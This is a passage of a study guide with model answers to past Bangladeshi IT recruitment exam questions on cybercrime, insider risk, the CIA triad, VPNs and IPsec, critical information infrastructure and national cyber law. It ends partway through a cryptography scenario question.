   - **Risk-based decisions** — knowing which actors target banks in South Asia shapes where budget and controls are placed.
   - **Automated response** — SOAR platforms consume intelligence and act without human delay.

   - Practical caution: intelligence is only useful if it is INTEGRATED and ACTED ON. A feed that nobody consumes into the firewall and SIEM is an expense, not a control.

9. **সাইবার অপরাধ কি? ৮টি সাইবার অপরাধ এর নাম লিখুন। সাইবার অপরাধ দূর করার জন্য ৬টি পন্থার নাম লিখুন।** *[BREB Junior Assistant Manager (ICT) 2021 compact it 948-949 (ET: N/A)]*

Answer:

   (a) Cybercrime
   - Any criminal act committed using a computer, network or digital device — where the device is the tool of the crime, the target, or both.

   (b) Eight cybercrimes
   - **Hacking** — unauthorised access to a computer system or network.
   - **Phishing** — impersonating a trusted party to steal credentials.
   - **Identity theft** — stealing personal information to impersonate someone.
   - **Ransomware attack** — encrypting a victim's data and demanding payment.
   - **Online financial fraud** — card fraud, banking fraud, MFS fraud.
   - **Cyberbullying and online harassment** — including cyberstalking and defamation.
   - **Data breach / data theft** — stealing confidential organisational or customer data.
   - **DDoS attack** — flooding a service so legitimate users cannot access it.

   Others: software piracy, cyber terrorism, child exploitation, spreading malware, and cryptocurrency fraud.

   (c) Six ways to counter cybercrime
   - **Strong technical controls** — firewall, antivirus and EDR, encryption, multi-factor authentication, and prompt patching.
   - **Public awareness and training** — since most cybercrime succeeds through social engineering rather than technical compromise.
   - **Strong legislation and enforcement** — up-to-date cyber law, specialised cyber tribunals, trained cyber police and digital forensic laboratories.
   - **National CERT/CIRT** — coordinated incident detection, response and information sharing.
   - **International cooperation** — cybercrime crosses borders, so mutual legal assistance and cross-border investigation are essential.
   - **Regular audit, VAPT and monitoring** — finding and fixing weaknesses before criminals exploit them, with 24/7 SOC monitoring.

10. **Employee causes the most risk of fraud and computer compromises- do you agree with the statement. Justify your answer.** *[Combined Bank Senior Officer (IT/ICT) 2019 compact it 1113 (ET: DU)]*

Answer: **Broadly yes — but with an important qualification.** Employees are the largest source of risk, though most of that risk comes from NEGLIGENCE rather than malice.

    (a) Arguments supporting the statement

    - **Legitimate access** — employees already hold valid credentials and are inside the perimeter, so firewalls, IPS and perimeter controls simply do not apply to them.
    - **Knowledge of the system** — an insider knows where the valuable data is, when monitoring is weak, and which controls can be avoided. An outsider must discover all of this.
    - **Trust** — their activity looks normal, so detection is far harder than for an external intruder.
    - **Phishing entry point** — the overwhelming majority of successful breaches begin with an employee clicking a link or opening an attachment. Technically the attacker is external, but the employee is the door.
    - **Negligence at scale** — weak or reused passwords, sharing credentials, losing an unencrypted laptop, misdirected email, using unauthorised cloud services, and leaving workstations unlocked.
    - **Privileged users** — system administrators and DBAs can bypass application-level controls entirely, and can often delete the logs that would record it.
    - **Departing employees** — data theft is common in the weeks before resignation, and orphaned accounts are frequently left active.
    - Industry breach studies consistently attribute a large share of incidents to an internal element.

    (b) Qualifications to the statement
    - **External attacks are more numerous**, even if individual insider incidents cause more damage per event.
    - Most insider incidents are **accidental**, not criminal — which changes the appropriate response from punishment to training and control design.
    - **Third parties and vendors** with system access represent a comparable risk that the statement omits.
    - Blaming employees can obscure a real failure of CONTROL DESIGN. If one person can move a large sum unchecked, that is a process failure, not merely a personnel failure.

    (c) Controls that follow from this
    - **Least privilege** and regular access review; immediate revocation on departure.
    - **Segregation of duties** and maker-checker approval for financial transactions.
    - **Privileged Access Management** with session recording, so administrators are also accountable.
    - **DLP** and monitoring of large or unusual data movements.
    - **UEBA** to detect behaviour that deviates from a user's own baseline.
    - **Mandatory leave and job rotation** — a long-running fraud usually surfaces when the person is away.
    - **Security awareness training with simulated phishing**, which addresses the negligence majority.
    - **Background verification** at recruitment and a clear acceptable use policy.

    - Balanced conclusion: agree that the employee is the single greatest risk vector, but the correct response is better control design and training rather than distrust of staff.

## Security Principles (CIA Triad) (8)

1. **What does CIA stand for in information security? Explain each component briefly.** *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*

Answer: **CIA stands for Confidentiality, Integrity and Availability** — the three fundamental goals of information security, known as the CIA triad.

   **Confidentiality**
   - Ensures that information is accessible only to those authorised to see it.
   - Protects against unauthorised disclosure.
   - Controls: encryption, access control, authentication, least privilege, data classification.
   - Violated by: data breach, eavesdropping, shoulder surfing, stolen credentials.

   **Integrity**
   - Ensures that information is accurate, complete and has not been altered by anyone unauthorised.
   - Protects against unauthorised modification.
   - Controls: hashing, digital signatures, checksums, version control, access control, audit logs.
   - Violated by: unauthorised modification of records, man-in-the-middle alteration, malware corruption.

   **Availability**
   - Ensures that information and systems are accessible to authorised users whenever needed.
   - Protects against disruption of access.
   - Controls: redundancy, backups, failover clusters, DDoS protection, UPS and generators, disaster recovery.
   - Violated by: DDoS attack, ransomware, hardware failure, natural disaster.

   How they interact
   - The three often pull against each other. Heavy encryption and strict access control strengthen confidentiality but can reduce availability. A completely open system is highly available but has no confidentiality.
   - Security design is therefore about BALANCE, chosen according to the data's sensitivity. A hospital emergency system prioritises availability; a classified document prioritises confidentiality.

2. **What is authentication and authorization? What is the CIA triad in cyber security? How does it work?** *[Combined Bank Officer (IT) 03.01.2026 debug it (ET: N/A)]*

Answer:

   (a) Authentication vs Authorisation

   | Point | Authentication | Authorisation |
   |---|---|---|
   | Question answered | **Who are you?** | **What are you allowed to do?** |
   | Purpose | Verify identity | Grant or deny permissions |
   | Order | Comes first | Comes after authentication |
   | Method | Password, OTP, biometrics, certificate | Access control lists, roles, permissions |
   | Visible to user | Yes — the user actively proves identity | Usually invisible, enforced silently |
   | Example | Logging into internet banking | Being allowed to view your own account but not another customer's |

   - Related terms: **identification** (claiming an identity) precedes authentication; **accounting/auditing** (recording what was done) follows authorisation. Together they form AAA.

   (b) The CIA triad
   - **Confidentiality** — only authorised people can access the information.
   - **Integrity** — the information is accurate and unaltered.
   - **Availability** — the information is accessible when needed.

   (c) How it works in practice — an online banking example
   - **Confidentiality** is enforced by TLS encrypting the session, by the password and OTP restricting access, and by the account being visible only to its owner.
   - **Integrity** is enforced by the transaction being hashed and signed, so the amount cannot be altered in transit, and by audit logs recording every change.
   - **Availability** is enforced by redundant servers, a DR site, DDoS protection and 24/7 monitoring, so the service is reachable when the customer needs it.

   - Each control usually serves one leg of the triad primarily, and a complete security design must address all three deliberately rather than assuming one covers the others.

3. **(a) What is the CIA triad of information system? Briefly describe its each component.** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*

Answer: The CIA triad is the foundational model of information security, defining the three properties every security control ultimately serves.

   ```mermaid
   flowchart TD
       C[Confidentiality<br/>only authorised access] --- I[Integrity<br/>accurate and unaltered]
       I --- A[Availability<br/>accessible when needed]
       A --- C
   ```

   **(a) Confidentiality**
   - Prevents unauthorised disclosure of information.
   - Achieved by: encryption at rest and in transit, strong authentication, role-based access control, least privilege, data classification and labelling, physical security.
   - Threats: data breach, eavesdropping, phishing, insider disclosure, stolen device.
   - Banking example: a customer's account balance must be visible only to that customer and authorised staff.

   **(b) Integrity**
   - Ensures data is accurate, complete and modified only by authorised parties in authorised ways.
   - Achieved by: cryptographic hashing, digital signatures, message authentication codes, checksums, database constraints, audit trails, version control, maker-checker approval.
   - Threats: unauthorised modification, man-in-the-middle tampering, malware corruption, human error.
   - Banking example: a transfer of 5,000 taka must not become 50,000 taka in transit or in storage.

   **(c) Availability**
   - Ensures authorised users can access systems and data whenever required.
   - Achieved by: redundancy and clustering, load balancing, backups with tested restores, DR site, UPS and generators, DDoS protection, capacity planning, patching.
   - Threats: DDoS, ransomware, hardware failure, power outage, natural disaster.
   - Banking example: ATMs and internet banking must work at 2 a.m. on a holiday.

   - Two further principles are often added to the triad: **Authenticity** (the data really is from who it claims) and **Non-repudiation** (the sender cannot deny sending it). Together these five are sometimes called the Parkerian or extended model.

4. **Describe how the principles of Confidentiality, Integrity, and Availability work together to protect organizational data, and provide one real-world example of a security breach where one or more of these principles were compromised.** *[Combined Bank Senior Officer (IT) 17.10.2025 compact it 1428 (ET: E-Zone)]*

Answer:

   (a) How the three work together
   - **All three are required simultaneously.** Protecting only one leaves the data effectively unprotected.
   - **Confidentiality without availability is useless** — data encrypted so thoroughly that nobody can retrieve it serves no business purpose.
   - **Availability without confidentiality is dangerous** — a database open to everyone is always available and completely insecure.
   - **Integrity underpins both** — data that is available and secret but WRONG causes decisions to fail. A bank whose balances are accurate is more important than one whose balances are merely secret.

   The balance is set by context
   - A hospital emergency system weights **availability** highest — a doctor must reach the record instantly.
   - A classified intelligence document weights **confidentiality** highest — better inaccessible than disclosed.
   - A banking ledger weights **integrity** highest — a wrong balance is worse than a slow one.

   Layered controls serve all three at once
   - Encryption serves confidentiality; hashing and signatures serve integrity; redundancy and backups serve availability. Access control and monitoring serve all three.

   (b) Real-world example — the **Bangladesh Bank heist, February 2016**
   - Attackers compromised the bank's SWIFT terminal and issued 35 fraudulent transfer instructions totalling about USD 951 million, of which USD 81 million reached accounts in the Philippines.

   Which principles were compromised
   - **Confidentiality** — attackers obtained SWIFT operator credentials and had read access to the payment system and internal network for weeks beforehand.
   - **Integrity** — fraudulent payment instructions were INJECTED into the system and appeared legitimate. Malware also altered the SWIFT software's database checks so the fraudulent messages passed validation.
   - **Availability** — malware manipulated the printer that produced confirmation slips, so staff did not see the transactions. The attack was also timed across a weekend and holidays to delay detection.

   Contributing weaknesses
   - Flat network with no segmentation between the SWIFT terminal and the general network, weak second-hand network equipment, no multi-factor authentication on critical systems, and insufficient monitoring.

   - The lesson: the attack succeeded not by breaking cryptography but by breaching all three principles through ordinary control failures — segmentation, authentication, monitoring and logging.

5. **What is CIA Triad?** *[EGCB Sub-Divisional Engineer (ICT) 28.01.2023 compact it 563 (ET: BUET)], [Teletalk Assistant Manager (IT) 2023 compact it 465 (ET: N/A)]*

Answer: The CIA triad is the core model of information security, consisting of three principles that every security control exists to protect.

   | Principle | Meaning | Achieved by | Violated by |
   |---|---|---|---|
   | **Confidentiality** | Only authorised people can access the data | Encryption, access control, authentication, least privilege | Data breach, eavesdropping, phishing |
   | **Integrity** | Data is accurate and unaltered | Hashing, digital signatures, checksums, audit logs | Unauthorised modification, MITM tampering |
   | **Availability** | Data and systems are accessible when needed | Redundancy, backups, DR site, DDoS protection | DDoS, ransomware, hardware failure |

   Why the triad matters
   - It gives a complete framework for assessing security. Every threat can be classified by which leg it attacks, and every control by which leg it protects.
   - It forces balance. Strengthening one leg often weakens another, so the design must be deliberate rather than accidental.

   Extended model
   - Two further properties are commonly added: **Authenticity** (the data genuinely originates from the claimed source) and **Non-repudiation** (the originator cannot later deny it).

   Mapping attacks to the triad

   | Attack | Principle violated |
   |---|---|
   | Eavesdropping, data theft | Confidentiality |
   | Data tampering, MITM modification | Integrity |
   | DDoS, ransomware | Availability |

6. **Preserving confidentiality integrity and availability of data is a restatement of the concern over falsification, interception, masquerade and denial of service. Explain how the first three concepts relate to the last four.** *[Bangladesh Bank Assistant Programmer 03.02.2023 compact it 435 (ET: BIBM)]*

Answer: Each of the four threats attacks one or more of the three principles. The mapping is as follows.

   | Threat | Principle violated | Explanation |
   |---|---|---|
   | **Interception** | **Confidentiality** | An unauthorised party gains access to data in transit or at rest. Nothing is changed and nothing stops working — only secrecy is lost. This is a passive attack |
   | **Falsification** | **Integrity** | Data is created, altered or deleted without authorisation, so it is no longer accurate. An active attack |
   | **Masquerade** | **Confidentiality AND Integrity** | An attacker impersonates a legitimate entity. Posing as a valid user gives them access to data they should not see (confidentiality) and lets them issue instructions as that user (integrity). It also violates **authenticity** |
   | **Denial of Service** | **Availability** | Legitimate users are prevented from accessing the system. No data is read or altered — only access is destroyed |

   Detailed relationships

   **Confidentiality ← Interception and Masquerade**
   - Interception breaks confidentiality directly, by reading data in transit. Countermeasure: encryption.
   - Masquerade breaks it indirectly, by obtaining authorised access under a false identity. Countermeasure: strong authentication and MFA.

   **Integrity ← Falsification and Masquerade**
   - Falsification is the direct attack — modifying a payment amount or a database record. Countermeasure: hashing, digital signatures, audit trails.
   - Masquerade enables it, because an attacker acting as an authorised user can make changes that appear legitimate. Countermeasure: authentication plus segregation of duties and maker-checker approval.

   **Availability ← Denial of Service**
   - The only one of the four that attacks availability. Countermeasure: redundancy, DDoS protection, capacity planning, backups.

   Grouping by attack nature
   - **Passive** — interception only. Hard to detect, easy to prevent with encryption.
   - **Active** — falsification, masquerade and DoS. Harder to prevent, easier to detect with integrity checks and monitoring.

   - The statement in the question is therefore accurate: the three positive goals (C, I, A) and the four negative threats describe the same security problem from opposite directions — what we want to preserve, and what would destroy it.

7. **Information System কী? Information Syetem -এর সুরক্ষায় প্রয়োজনীয় পদক্ষেপ সংক্ষেপে বর্ণনা করুন?** *[41th BCS 2021 compact it 883-884 (ET: N/A)]*

Answer:

   (a) Information System
   - An organised combination of people, hardware, software, data, networks and procedures that collects, processes, stores and distributes information to support decision making and operations in an organisation.

   Five components
   - **Hardware** — servers, computers, network devices, storage.
   - **Software** — operating systems, databases, applications.
   - **Data** — the raw facts and the information produced from them.
   - **People** — users, operators, analysts, administrators.
   - **Procedures** — the documented rules for operating the system.

   Types
   - TPS (transaction processing), MIS (management reporting), DSS (decision support), ESS (executive support), ERP, CRM.

   (b) Necessary steps to secure an information system

   **Technical measures**
   - **Access control** — strong authentication, multi-factor authentication, role-based permissions, least privilege.
   - **Encryption** of data at rest and in transit.
   - **Firewall, IPS and network segmentation** to contain any breach.
   - **Antivirus and EDR** on every endpoint.
   - **Patch management** — the single most effective technical control.
   - **Backup** following the 3-2-1 rule, with tested restores.
   - **Logging and monitoring** through a SIEM.

   **Physical measures**
   - Controlled access to server rooms with biometrics and CCTV, UPS and generator, fire detection and clean-agent suppression, environmental monitoring.

   **Administrative measures**
   - Written **security policy** and acceptable use policy.
   - **Security awareness training** for all staff, with simulated phishing.
   - **Incident response plan** and **business continuity / DR plan**, both tested.
   - **Segregation of duties** and maker-checker approval for financial operations.
   - Regular **audit and VAPT**.
   - **Vendor risk assessment** and background verification at recruitment.

   **Legal and compliance**
   - Compliance with the Bangladesh Bank ICT Security Guideline, ISO 27001 and applicable data protection law.

   - Guiding principle: **defence in depth** — technical, physical and administrative layers together, since no single control is sufficient.

8. **What is non-repudiation in network security? Give a proper example.** *[Bangladesh Water Development Board Assistant Programmer 2018 compact it 1189 (ET: N/A)]*

Answer: **Non-repudiation** is the assurance that someone cannot later DENY having sent a message or performed an action. It provides undeniable proof of origin and of delivery.

   Why it is needed
   - Authentication proves who someone is at the time of the transaction. Non-repudiation proves it AFTERWARDS, to a third party such as a court or auditor, even if the person now denies it.

   How it is achieved
   - **Digital signatures** — the primary mechanism. The sender signs with their PRIVATE key, which only they possess. Anyone can verify it with the public key, so the sender cannot credibly claim someone else produced it.
   - **Digital certificates from a trusted CA**, binding that key to a verified identity.
   - **Audit logs and timestamps**, ideally from a trusted timestamping authority.
   - **Blockchain**, where records are immutable and publicly verifiable.

   Proper example — a bank payment instruction
   - A corporate customer sends an instruction to transfer 50 lakh taka, signed with their private key.
   - The bank verifies the signature with the customer's public key from their certificate and executes the transfer.
   - Later the customer claims they never authorised it and demands a refund.
   - The bank produces the signed instruction. Since only the customer holds that private key, the signature could not have been produced by anyone else. **The customer cannot repudiate the transaction.**
   - Without a digital signature, the bank would have only its own logs, which the customer could argue were fabricated.

   Second example — email
   - A digitally signed email proves the sender wrote it. An ordinary unsigned email proves nothing, because the From address is trivially forged.

   Where non-repudiation sits
   - It is not part of the original CIA triad; it is added in the extended model alongside authenticity. It is the property that makes electronic contracts, e-tendering and digital banking legally workable, and it is why the ICT Act 2006 gives digital signatures legal recognition in Bangladesh.

## VPN & Tunneling Protocols (IPsec, SSL VPN) (6)

1. **What is the purpose of VPN used in computer security?** *[Dhaka Mass Transit Company Limited (DMTCL) Assistant Engineer (ICT) 27.01.2023 compact it 476 (ET: N/A)]*

Answer: A **VPN (Virtual Private Network)** creates an encrypted tunnel across a public network, so that data travels as if it were on a private network.

   Purposes in computer security
   - **Confidentiality** — all traffic inside the tunnel is encrypted, so an attacker on public Wi-Fi or an ISP cannot read it.
   - **Secure remote access** — employees working from home reach internal servers safely, without exposing those servers to the internet.
   - **Connecting branch offices** — a site-to-site VPN links two offices over the internet at a fraction of the cost of a leased line.
   - **Authentication** — only users with valid credentials or certificates can establish the tunnel.
   - **Integrity** — the protocol detects any modification of the data in transit.
   - **Hiding the internal network** — internal IP addresses and topology are not exposed.
   - **Anonymity and location masking** — the destination sees the VPN server's IP, not the user's.
   - **Bypassing geographic restrictions** and censorship.
   - **Protection on untrusted networks** — hotel, airport and café Wi-Fi become usable for sensitive work.

   Common protocols
   - **IPsec** (network layer), **SSL/TLS VPN** (browser based), **OpenVPN**, **WireGuard**, **L2TP/IPsec**. PPTP is obsolete and insecure.

   - Limitation worth noting: a VPN protects the CHANNEL, not the endpoints. An infected laptop connected by VPN brings its malware straight onto the corporate network, which is why endpoint health checking is used alongside.

2. **In which layer IPsec works?** *[BCC Assistant Programmer 11.11.2023 compact it 547 (ET: N/A)]*

Answer: **IPsec works at the Network layer (Layer 3)** of the OSI model, and at the Internet layer of the TCP/IP model.

   Why the layer matters
   - Operating at layer 3 means IPsec protects **every application automatically**, without any change to the applications themselves. HTTP, FTP, SMTP and any other protocol carried over IP are all secured.
   - By contrast, **SSL/TLS works at the Transport/Session layer (Layer 4-5)** and secures only the applications written to use it.

   IPsec components
   - **AH (Authentication Header)** — provides authentication and integrity, but NOT encryption.
   - **ESP (Encapsulating Security Payload)** — provides encryption, authentication and integrity. This is what is normally used.
   - **IKE (Internet Key Exchange)** — negotiates the security association and exchanges keys, on UDP port 500.

   Two modes

   | Mode | What is protected | Used for |
   |---|---|---|
   | **Transport mode** | Only the payload; the original IP header is kept | Host-to-host communication |
   | **Tunnel mode** | The ENTIRE original packet is encrypted and given a new IP header | Site-to-site VPN — the standard choice |

   - Tunnel mode is what makes a site-to-site VPN possible, because the original source and destination addresses are hidden inside the encrypted payload.

3. **What is VPN? How it is working.** *[BOF Assistant Programmer 2022 compact it 732 (ET: MIST)]*

Answer: A VPN is a technology that creates a secure encrypted tunnel over a public network, allowing private data to travel across the internet as if it were on a private link.

   How it works
   ```mermaid
   flowchart LR
       U[User device<br/>VPN client] -->|1. authenticate| S[VPN Server / Gateway]
       U -->|2. encrypted tunnel over the internet| S
       S -->|3. decrypt and forward| N[Internal network / Internet]
       N -->|4. response| S
       S -->|5. re-encrypt and return| U
   ```

   - **Step 1 — Authentication.** The client contacts the VPN server and proves its identity with a username and password, a certificate, or a pre-shared key.
   - **Step 2 — Tunnel establishment.** Both sides negotiate the encryption algorithm and exchange keys, typically using IKE for IPsec or a TLS handshake for SSL VPN.
   - **Step 3 — Encapsulation.** Each original packet is wrapped inside a new packet — the original headers and payload become the payload of the outer packet.
   - **Step 4 — Encryption.** The encapsulated packet is encrypted, so anyone intercepting it sees only ciphertext with the VPN server as the visible destination.
   - **Step 5 — Transmission.** The packet crosses the public internet normally.
   - **Step 6 — Decryption and forwarding.** The VPN server decrypts, removes the outer wrapper and forwards the original packet to its real destination.
   - The return path reverses the process.

   Protocols
   - **IPsec** (layer 3), **SSL/TLS VPN** (browser based, no client needed), **OpenVPN**, **WireGuard** (modern, fast, simple), **L2TP/IPsec**. **PPTP is obsolete and must not be used.**

   Benefits
   - Encryption on untrusted networks, secure remote access, low-cost branch connectivity, hidden internal topology, and IP address masking.

4. **(a) How can VPN provide secure communication platform? Explain site-to-site VPN and remote-access VPN using necessary figures.** *[BPSC Sub-Assistant Engineer (Ministry of Agriculture) 2021 compact it 800 (ET: N/A)]*

Answer:

   (a) How a VPN provides secure communication
   - **Encryption** — AES or ChaCha20 encrypts everything inside the tunnel, so interception yields only ciphertext.
   - **Authentication** — certificates, pre-shared keys or user credentials ensure only authorised endpoints can join.
   - **Integrity** — HMAC detects any tampering with packets in transit.
   - **Tunnelling / encapsulation** — the original packet including its addresses is hidden inside the outer packet, concealing the internal topology.
   - **Key exchange** — IKE or TLS establishes fresh session keys, ideally with forward secrecy.

   (b) Site-to-Site VPN
   - Connects two entire NETWORKS — typically a head office and a branch — through VPN gateways at each end. Individual computers need no VPN software; the gateways handle everything.

   ```mermaid
   flowchart LR
       subgraph HO [Head Office LAN]
           A[PC] --- B[Server]
       end
       HO --- G1[VPN Gateway 1]
       G1 -->|encrypted IPsec tunnel<br/>over the internet| G2[VPN Gateway 2]
       G2 --- BR
       subgraph BR [Branch Office LAN]
           C[PC] --- D[Printer]
       end
   ```

   - Uses **IPsec in tunnel mode**, and the tunnel is permanently established.
   - Transparent to users — a branch employee reaches head office servers exactly as if on the same LAN.
   - Two forms: **intranet VPN** (offices of the same organisation) and **extranet VPN** (connecting to a partner or supplier).

   (c) Remote-Access VPN
   - Connects an INDIVIDUAL USER to the corporate network from anywhere. VPN client software runs on the user's own device.

   ```mermaid
   flowchart LR
       U1[Employee laptop<br/>at home] -->|encrypted tunnel| GW[VPN Gateway / Concentrator]
       U2[Employee phone<br/>travelling] -->|encrypted tunnel| GW
       GW --- LAN[Corporate LAN<br/>servers and files]
   ```

   - Uses **SSL/TLS VPN** (often browser-based, no client install) or **IPsec with a client**.
   - Established on demand, and torn down when the user disconnects.
   - Requires per-user authentication, ideally with MFA.

   Comparison

   | Point | Site-to-Site | Remote-Access |
   |---|---|---|
   | Connects | Network to network | User to network |
   | Client software | Not needed on user devices | Required on each device |
   | Tunnel duration | Always on | On demand |
   | Typical protocol | IPsec tunnel mode | SSL/TLS VPN or IPsec client |
   | Scale | A few fixed sites | Many mobile users |
   | Configured by | Network administrators, once | Each user, per session |

5. **What is VPN? Difference between site to site VPN and Remote access VPN.** *[RAKUB Network System Engineer (PO) 10.10.2021 compact it 840 (ET: N/A)]*

Answer:

   (a) VPN
   - A Virtual Private Network creates an encrypted tunnel across a public network, so private data travels securely as if on a dedicated private link. It provides confidentiality, authentication and integrity.

   (b) Site-to-Site VPN vs Remote-Access VPN

   | Point | Site-to-Site VPN | Remote-Access VPN |
   |---|---|---|
   | What it connects | Two complete networks | One user device to a network |
   | Endpoints | VPN gateway to VPN gateway | VPN client to VPN gateway |
   | Client software on user devices | Not required | Required (or a browser for SSL VPN) |
   | Tunnel | Permanently established | Created on demand, per session |
   | User awareness | Transparent — users do not know it exists | The user actively connects |
   | Typical protocol | IPsec in tunnel mode | SSL/TLS VPN, or IPsec with a client |
   | Authentication | Between gateways, using certificates or a pre-shared key | Per user, ideally with MFA |
   | Number of connections | Few and fixed | Many and variable |
   | Bandwidth need | High — carries all inter-office traffic | Moderate per user |
   | Typical use | Head office to branch office | Employee working from home or travelling |
   | Management | Configured once by network admins | Managed per user account |

   When each is used
   - **Site-to-site** — a bank connecting 50 branches to head office. Cheaper than leased lines and requires no configuration on individual PCs.
   - **Remote-access** — the same bank's officers connecting from home, or an auditor accessing systems while travelling.

   - Most organisations run both: site-to-site tunnels for permanent branch connectivity, and a remote-access concentrator for mobile staff.

6. **What is VPN? Why we use it?** *[Sonali Bank Ltd. Officer IT 2021 compact it 909 (ET: N/A)]*

Answer:

   (a) VPN
   - A Virtual Private Network is a technology that establishes an encrypted tunnel over a public network such as the internet, so that data travels privately and securely between two points.

   (b) Why we use it

   **Security reasons**
   - **Encryption of traffic** — protects data from eavesdropping on public Wi-Fi, hotel networks and untrusted ISPs.
   - **Secure remote access** — staff reach internal systems without those systems being exposed to the internet.
   - **Authentication** — only verified users and devices can establish the tunnel.
   - **Data integrity** — tampering in transit is detected.
   - **Hides internal network structure** from outside observers.

   **Business reasons**
   - **Cost saving** — a site-to-site VPN over the internet costs far less than a dedicated leased line between offices.
   - **Supports remote and hybrid work** — a necessity since 2020.
   - **Connects branches, ATMs and partner organisations** securely.
   - **Compliance** — regulators including Bangladesh Bank require encrypted remote access to banking systems.

   **Practical reasons**
   - **Privacy** — the ISP and websites see the VPN server's address, not the user's.
   - **Bypassing geographic restrictions** and censorship.
   - **Safe use of public networks** for banking and email.

   - Limitation to state: a VPN secures the connection, not the device. An infected laptop on a VPN carries its malware directly into the corporate network, so endpoint security and posture checking must accompany it.

## Critical Information Infrastructure (CII) & Cyber Governance (3)

1. **What is CII? How many CII organizations? Name 10 CII organization name.** *[BEPRC Assistant Programmer 08.08.2026 (ET: N/A)]*

Answer:

   (a) What CII is
   - **Critical Information Infrastructure** means the computer systems, networks and data whose destruction or disruption would have a debilitating effect on national security, the economy, public health or public safety.
   - In Bangladesh it is declared by government gazette by the ICT Division, and CII organisations must meet stricter security, audit and incident-reporting obligations.
   - Sectors typically covered: government administration, banking and finance, energy and power, telecommunications, health, transport, water and defence.

   (b) How many CII organisations in Bangladesh
   - The first gazette in **October 2022** declared **29 organisations** under section 15 of the Digital Security Act 2018.
   - In **August 2023** five more were added, bringing the total to **34**.
   - The number has since been reported as **35**. Because the list is periodically extended by gazette, the current figure should be checked against the latest ICT Division notification.  <!-- verify -->

   (c) Ten CII organisations
   - President's Office
   - Prime Minister's Office
   - Bangladesh Bank
   - National Board of Revenue (NBR)
   - Bangladesh Data Center Company Limited (BDCCL)
   - Election Commission Secretariat (NID Wing)
   - Bangladesh Telecommunication Regulatory Commission (BTRC)
   - Bangladesh Computer Council (BCC)
   - Bangladesh Power Development Board (BPDB)
   - Department of Immigration and Passports

   Others in the list include the Ministry of Foreign Affairs, Bangladesh Railway, Biman Bangladesh Airlines, Chittagong Port Authority, Titas Gas and various state-owned banks.

   Obligations placed on a CII organisation
   - Appoint a designated security officer, conduct regular audits and VAPT, report incidents to the national CIRT, implement the prescribed security controls, and maintain a disaster recovery plan.

2. **CTC কী? কী কাজে ব্যবহার হয়?** *[Assistant Programmer - Department of Immigration & Passports 15.07.2026 compact it 1464 (ET: N/A)]*

Answer: The abbreviation **CTC** has several meanings, and the intended one depends on context. In a cyber security and immigration context the most likely readings are:

   **(a) Counter Terrorism Centre / Counter Terrorism and Transnational Crime (CTTC)**
   - In Bangladesh, the **Counter Terrorism and Transnational Crime (CTTC)** unit of Dhaka Metropolitan Police handles terrorism, cybercrime and transnational organised crime.
   - Its **Cyber Crime Investigation Division** investigates online fraud, hacking, cyberbullying, and online radicalisation. It is the unit most citizens deal with when reporting a cybercrime.

   **(b) In networking — Cisco Transceiver Compatibility / Central Trunk Controller**, which is unlikely here.

   **(c) In HR — Cost To Company**, the total annual cost of an employee, again unlikely in this paper.

   **(d) In immigration — Certificate of Travel Clearance / Travel Certificate**, issued in place of a passport for one-time travel.

   - Given that the question comes from a Department of Immigration and Passports paper alongside cyber security topics, **Counter Terrorism and Transnational Crime (CTTC)** with its cybercrime investigation role is the most probable intended answer. The abbreviation as printed is ambiguous.  <!-- verify -->

3. **(c) Briefly write about the cybersecurity laws of Bangladesh.** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*

Answer: Bangladesh's cyber law has changed repeatedly, so the sequence matters.

   **(a) ICT Act 2006 (Information and Communication Technology Act)**
   - The first comprehensive law. It gave legal recognition to electronic records and **digital signatures**, established the **Controller of Certifying Authorities (CCA)**, and created offences for hacking, data theft and publishing obscene material electronically.
   - Its section 57 was heavily criticised for restricting free expression and was eventually repealed.

   **(b) Digital Security Act 2018 (DSA)**
   - Replaced the controversial provisions of the ICT Act. It created the **Digital Security Agency**, the **National Computer Incident Response Team (CIRT)**, and a Digital Security Council.
   - **Section 15** provided for declaring **Critical Information Infrastructure**, under which 29 organisations were gazetted in 2022.
   - It covered offences including illegal access, digital forgery, identity fraud, cyber terrorism and defamation.
   - It drew sustained criticism from journalists and rights groups for vaguely defined speech offences and non-bailable provisions.

   **(c) Cyber Security Act 2023**
   - Enacted 13 September 2023, replacing the Digital Security Act. It retained the CII framework and the CIRT, made several offences bailable and reduced some penalties, but critics argued the core speech provisions were largely carried over.

   **(d) Cyber Security Ordinance 2025**
   - On **22 May 2025** the interim government **repealed the Cyber Security Act 2023** and introduced the **Cyber Security Ordinance 2025**, which is the currently operative instrument.  <!-- verify -->

   **Other relevant instruments**
   - **Bangladesh Telecommunication Regulation Act 2001** — governs telecom and internet services.
   - **Bangladesh Bank ICT Security Guideline** — mandatory security standards for banks and financial institutions, covering data centres, access control, incident reporting and DR.
   - **Right to Information Act 2009** and the **Pornography Control Act 2012**.
   - A dedicated **Data Protection law** has been in draft for several years.

   **Institutions**
   - National Cyber Security Agency, BGD e-GOV CIRT, the Cyber Tribunal, and the CTTC cybercrime unit of the police.

   - Because this area has changed three times in seven years, an exam answer should state the sequence and name the current instrument rather than treating any one Act as permanent.

## Cryptography & Network Security Scenarios (3)

1. **Cryptography and Network Security Scenario: [BSCCPL AME 21-08-2026 (BUET)] Cox's Bazar wants to send confidential information to Kuakata through an insecure network. Cox's Bazar first generates a hash value using a Hash Function (H). The message, hash value, and routing data are combined and encrypted using Kuakata's Public Key (Ku). The encrypted ciphertext is transmitted through the network. During transmission, an attacker positioned between Cox's Bazar and Kuakata intercepts the encrypted data. The attacker captures the ciphertext and deliberately blocks it so that Kuakata never receives the message. However, the attacker is unable to read or decrypt the original message because Kuakata's Private Key (\text{Ku}^{-1}) is not available to the attacker. Kuakata is expected to decrypt the received ciphertext using its Private Key (\text{Ku}^{-1}) and verify the integrity of the message using the hash value whenever the message is successfully delivered. Questions: (a) Is there any digital signature? (b) Identify attack. (c) How to identify origin of the? (d) How to manage the attack. (e) Does the described communication provide a Digital Signature? Give reasons. If not, explain how Cox's Bazar can add a Digital Signature using Cox's Bazar's Private Key (\text{Kc}^{-1}) and verification using Cox's Bazar's Public Key (\text{Kc}). (f) Which security services are provided by the system among Confidentiality, Integrity, Authentication, Non-repudiation, and Availability? (g) Suggest suitable techniques or mechanisms to protect the communication against the attack identified in question (b). (h) Draw a complete communication diagram showing \text{Message} \to \text{Hash} \to \text{Routing Data} \to \text{Encryption with Ku} \to \text{Attacker} \to 